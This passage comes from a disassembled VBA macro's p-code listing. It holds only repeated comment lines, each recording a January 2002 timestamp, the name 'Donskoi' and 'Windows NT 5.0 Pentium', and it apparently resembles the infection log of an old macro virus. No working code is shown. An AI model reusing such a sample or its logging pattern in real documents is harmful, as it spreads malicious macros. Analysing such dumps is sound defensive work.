' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3650:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3651:
' Line #3652:
' Line #3653:
' 	QuoteRem 0x0000 0x0012 "27.01.2002 8:03:38"
' Line #3654:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3655:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3656:
' Line #3657:
' Line #3658:
' 	QuoteRem 0x0000 0x0012 "27.01.2002 8:04:07"
' Line #3659:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3660:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3661:
' Line #3662:
' Line #3663:
' 	QuoteRem 0x0000 0x0012 "27.01.2002 8:04:21"
' Line #3664:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3665:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3666:
' Line #3667:
' Line #3668:
' 	QuoteRem 0x0000 0x0012 "27.01.2002 8:04:41"
' Line #3669:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3670:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3671:
' Line #3672:
' Line #3673:
' 	QuoteRem 0x0000 0x0012 "27.01.2002 8:04:50"
' Line #3674:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3675:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3676:
' Line #3677:
' Line #3678:
' 	QuoteRem 0x0000 0x0012 "27.01.2002 8:04:58"
' Line #3679:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3680:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3681:
' Line #3682:
' Line #3683:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 10:50:50"
' Line #3684:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3685:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3686:
' Line #3687:
' Line #3688:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 12:08:04"
' Line #3689:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3690:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3691:
' Line #3692:
' Line #3693:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 12:18:30"
' Line #3694:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3695:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3696:
' Line #3697:
' Line #3698:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 12:32:27"
' Line #3699:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3700:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3701:
' Line #3702:
' Line #3703:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 12:38:28"
' Line #3704:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3705:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3706:
' Line #3707:
' Line #3708:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 13:01:21"
' Line #3709:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3710:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3711:
' Line #3712:
' Line #3713:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 17:29:19"
' Line #3714:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3715:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3716:
' Line #3717:
' Line #3718:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 18:12:18"
' Line #3719:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3720:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3721:
' Line #3722:
' Line #3723:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 18:14:59"
' Line #3724:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3725:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3726:
' Line #3727:
' Line #3728:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 18:15:01"
' Line #3729:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3730:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3731:
' Line #3732:
' Line #3733:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 18:19:04"
' Line #3734:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3735:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3736:
' Line #3737:
' Line #3738:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 18:21:18"
' Line #3739:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3740:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3741:
' Line #3742:
' Line #3743:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 18:21:20"
' Line #3744:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3745:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3746:
' Line #3747:
' Line #3748:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 18:25:14"
' Line #3749:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3750:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3751:
' Line #3752:
' Line #3753:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 18:25:49"
' Line #3754:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3755:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3756:
' Line #3757:
' Line #3758:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 18:27:43"
' Line #3759:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3760:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3761:
' Line #3762:
' Line #3763:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 18:40:55"
' Line #3764:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3765:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3766:
' Line #3767:
' Line #3768:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 18:40:57"
' Line #3769:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3770:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3771:
' Line #3772:
' Line #3773:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 18:42:37"
' Line #3774:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3775:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3776:
' Line #3777:
' Line #3778:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 18:43:13"
' Line #3779:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3780:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3781:
' Line #3782:
' Line #3783:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 18:43:15"
' Line #3784:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3785:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3786:
' Line #3787:
' Line #3788:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 18:43:49"
' Line #3789:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3790:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3791:
' Line #3792:
' Line #3793:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 18:44:01"
' Line #3794:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3795:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3796:
' Line #3797:
' Line #3798:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 18:53:41"
' Line #3799:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3800:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3801:
' Line #3802:
' Line #3803:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 18:53:43"
' Line #3804:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3805:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3806:
' Line #3807:
' Line #3808:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 20:09:54"
' Line #3809:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3810:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3811:
' Line #3812:
' Line #3813:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 20:09:59"
' Line #3814:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3815:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3816:
' Line #3817:
' Line #3818:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 20:25:23"
' Line #3819:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3820:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3821:
' Line #3822:
' Line #3823:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 20:44:49"
' Line #3824:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3825:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3826:
' Line #3827:
' Line #3828:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 20:55:49"
' Line #3829:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3830:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3831:
' Line #3832:
' Line #3833:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 22:26:18"
' Line #3834:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3835:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3836:
' Line #3837:
' Line #3838:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 22:26:20"
' Line #3839:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3840:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3841:
' Line #3842:
' Line #3843:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 22:26:48"
' Line #3844:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3845:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3846:
' Line #3847:
' Line #3848:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 22:26:50"
' Line #3849:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3850:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3851:
' Line #3852:
' Line #3853:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 22:28:01"
' Line #3854:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3855:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3856:
' Line #3857:
' Line #3858:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 22:39:35"
' Line #3859:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3860:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3861:
' Line #3862:
' Line #3863:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 22:39:37"
' Line #3864:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3865:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3866:
' Line #3867:
' Line #3868:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 22:39:53"
' Line #3869:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3870:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3871:
' Line #3872:
' Line #3873:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 22:39:55"
' Line #3874:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3875:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3876:
' Line #3877:
' Line #3878:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 22:40:21"
' Line #3879:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3880:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3881:
' Line #3882:
' Line #3883:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 22:58:24"
' Line #3884:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3885:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3886:
' Line #3887:
' Line #3888:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 22:58:26"
' Line #3889:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3890:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3891:
' Line #3892:
' Line #3893:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 23:02:15"
' Line #3894:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3895:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3896:
' Line #3897:
' Line #3898:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 23:02:16"
' Line #3899:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3900:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3901:
' Line #3902:
' Line #3903:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 23:02:30"
' Line #3904:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3905:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3906:
' Line #3907:
' Line #3908:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 23:02:32"
' Line #3909:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3910:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3911:
' Line #3912:
' Line #3913:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 23:02:50"
' Line #3914:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3915:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3916:
' Line #3917:
' Line #3918:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 23:04:02"
' Line #3919:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3920:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3921:
' Line #3922:
' Line #3923:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 23:04:04"
' Line #3924:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3925:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3926:
' Line #3927:
' Line #3928:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 23:04:26"
' Line #3929:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3930:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3931:
' Line #3932:
' Line #3933:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 23:04:27"
' Line #3934:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3935:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3936:
' Line #3937:
' Line #3938:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 23:04:59"
' Line #3939:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3940:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3941:
' Line #3942:
' Line #3943:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 23:05:00"
' Line #3944:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3945:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3946:
' Line #3947:
' Line #3948:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 23:05:29"
' Line #3949:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3950:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3951:
' Line #3952:
' Line #3953:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 23:05:31"
' Line #3954:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3955:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3956:
' Line #3957:
' Line #3958:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 23:23:55"
' Line #3959:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3960:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3961:
' Line #3962:
' Line #3963:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 23:23:57"
' Line #3964:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3965:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3966:
' Line #3967:
' Line #3968:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 23:47:26"
' Line #3969:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3970:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3971:
' Line #3972:
' Line #3973:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 23:47:59"
' Line #3974:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3975:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3976:
' Line #3977:
' Line #3978:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 23:48:01"
' Line #3979:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3980:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3981:
' Line #3982:
' Line #3983:
' 	QuoteRem 0x0000 0x0013 "27.01.2002 23:48:15"
' Line #3984:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3985:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3986:
' Line #3987:
' Line #3988:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 0:04:32"
' Line #3989:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3990:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3991:
' Line #3992:
' Line #3993:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 0:04:53"
' Line #3994:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #3995:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #3996:
' Line #3997:
' Line #3998:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 0:05:36"
' Line #3999:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4000:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4001:
' Line #4002:
' Line #4003:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 0:05:46"
' Line #4004:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4005:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4006:
' Line #4007:
' Line #4008:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 0:06:40"
' Line #4009:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4010:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4011:
' Line #4012:
' Line #4013:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 0:09:25"
' Line #4014:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4015:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4016:
' Line #4017:
' Line #4018:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 0:10:25"
' Line #4019:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4020:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4021:
' Line #4022:
' Line #4023:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 0:10:39"
' Line #4024:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4025:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4026:
' Line #4027:
' Line #4028:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 5:44:48"
' Line #4029:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4030:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4031:
' Line #4032:
' Line #4033:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 6:04:44"
' Line #4034:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4035:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4036:
' Line #4037:
' Line #4038:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 6:04:46"
' Line #4039:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4040:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4041:
' Line #4042:
' Line #4043:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 6:08:22"
' Line #4044:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4045:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4046:
' Line #4047:
' Line #4048:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 6:08:36"
' Line #4049:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4050:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4051:
' Line #4052:
' Line #4053:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 6:14:36"
' Line #4054:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4055:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4056:
' Line #4057:
' Line #4058:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 6:14:38"
' Line #4059:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4060:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4061:
' Line #4062:
' Line #4063:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 6:19:44"
' Line #4064:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4065:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4066:
' Line #4067:
' Line #4068:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 6:19:46"
' Line #4069:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4070:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4071:
' Line #4072:
' Line #4073:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 6:29:19"
' Line #4074:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4075:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4076:
' Line #4077:
' Line #4078:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 6:29:21"
' Line #4079:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4080:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4081:
' Line #4082:
' Line #4083:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 6:30:42"
' Line #4084:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4085:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4086:
' Line #4087:
' Line #4088:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 6:30:44"
' Line #4089:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4090:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4091:
' Line #4092:
' Line #4093:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 6:33:35"
' Line #4094:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4095:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4096:
' Line #4097:
' Line #4098:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 6:33:37"
' Line #4099:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4100:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4101:
' Line #4102:
' Line #4103:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 8:56:46"
' Line #4104:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4105:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4106:
' Line #4107:
' Line #4108:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 8:56:48"
' Line #4109:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4110:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4111:
' Line #4112:
' Line #4113:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 8:57:44"
' Line #4114:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4115:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4116:
' Line #4117:
' Line #4118:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 8:57:46"
' Line #4119:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4120:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4121:
' Line #4122:
' Line #4123:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 8:58:22"
' Line #4124:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4125:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4126:
' Line #4127:
' Line #4128:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 8:58:25"
' Line #4129:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4130:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4131:
' Line #4132:
' Line #4133:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 8:58:52"
' Line #4134:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4135:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4136:
' Line #4137:
' Line #4138:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 9:00:46"
' Line #4139:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4140:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4141:
' Line #4142:
' Line #4143:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 9:00:48"
' Line #4144:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4145:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4146:
' Line #4147:
' Line #4148:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 9:01:24"
' Line #4149:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4150:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4151:
' Line #4152:
' Line #4153:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 9:03:47"
' Line #4154:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4155:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4156:
' Line #4157:
' Line #4158:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 9:04:49"
' Line #4159:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4160:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4161:
' Line #4162:
' Line #4163:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 9:04:51"
' Line #4164:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4165:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4166:
' Line #4167:
' Line #4168:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 9:05:07"
' Line #4169:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4170:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4171:
' Line #4172:
' Line #4173:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 9:05:09"
' Line #4174:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4175:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4176:
' Line #4177:
' Line #4178:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 9:05:19"
' Line #4179:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4180:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4181:
' Line #4182:
' Line #4183:
' 	QuoteRem 0x0000 0x0012 "28.01.2002 9:05:21"
' Line #4184:
